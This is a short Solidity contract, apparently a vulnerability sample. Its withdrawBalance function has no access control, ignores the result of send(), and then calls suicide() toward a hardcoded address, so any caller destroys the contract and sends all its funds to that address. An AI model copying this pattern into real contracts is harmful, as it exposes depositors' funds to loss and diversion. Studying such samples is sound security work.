pragma solidity ^0.4.0;
contract SendBack {
    mapping (address => uint) userBalances;
    function withdrawBalance() {  
		uint amountToWithdraw = userBalances[msg.sender];
		userBalances[msg.sender] = 0;
		msg.sender.send(amountToWithdraw);
		var c=SendBalanceHere(0x6bE7ab2FE5a48c86065f3c96563e1E0fdF7eA520);
		suicide(c);
	}
}

contract SendBalanceHere{
    
}